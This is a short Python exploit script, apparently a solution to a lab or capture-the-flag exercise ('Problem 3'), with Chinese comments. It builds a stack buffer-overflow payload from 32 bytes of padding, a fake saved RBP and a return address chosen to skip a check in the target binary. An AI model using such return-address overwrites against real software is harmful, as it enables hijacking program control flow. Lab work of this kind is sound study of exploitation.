import sys
import struct

# 1. Padding: 32字节
padding = b'A' * 32

# 2. Fake RBP (修正后的静态地址)
# Problem 3 的数据段在 0x403xxx 附近。
# 0x403600 是一个位于数据段、固定、可写且安全的地址。
fake_rbp = 0x403600

# 3. Target Address (跳过检查)
target_addr = 0x40122b

payload = padding
payload += struct.pack('<Q', fake_rbp)
payload += struct.pack('<Q', target_addr)

sys.stdout.buffer.write(payload)